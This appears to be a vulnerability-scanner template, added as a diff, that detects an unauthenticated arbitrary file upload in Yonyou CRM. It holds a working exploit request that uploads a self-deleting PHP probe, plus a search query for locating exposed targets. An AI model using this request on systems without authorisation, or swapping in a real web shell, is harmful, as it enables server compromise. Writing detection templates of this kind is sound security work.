@@ -1,0 +1,63 @@
+http:
+- extractors:
+  - group: 1
+    internal: true
+    name: uploadfile
+    part: body
+    regex:
+    - (upd\w+\.tmp\.php)
+    type: regex
+  matchers:
+  - part: body
+    type: word
+    words:
+    - '2468642'
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'POST /ajax/uploadfile.php?DontCheckLogin=1&vname=file HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Connection: close
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+
+
+    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+
+    Content-Disposition: form-data; name="file"; filename="%s.php "
+
+    Content-Type: application/octet-stream
+
+
+    <?php print(1111*2222);unlink(__FILE__);?>
+
+    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+
+    Content-Disposition: form-data; name="upload"
+
+
+    upload
+
+    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--
+
+    '
+  - 'GET /tmpfile/{{uploadfile}} HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+id: yonyou-crm-arbitrary-file-upload
+info:
+  author: Co5mos
+  description: "\u7528\u53CBCRM\u7CFB\u7EDF\u7684uploadfile.php\u63A5\u53E3\u5B58\u5728\
+    \u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u53EF\
+    \u901A\u8FC7\u8BE5\u6F0F\u6D1E\u4E0A\u4F20\u4EFB\u610F\u6587\u4EF6\u3002"
+  metadata:
+    fofa-query: "app=\"\u7528\u53CBU8CRM\""
+  name: Yonyou CRM - Arbitrary File Upload
+  severity: high
+  tags: yonyou,crm,fileupload
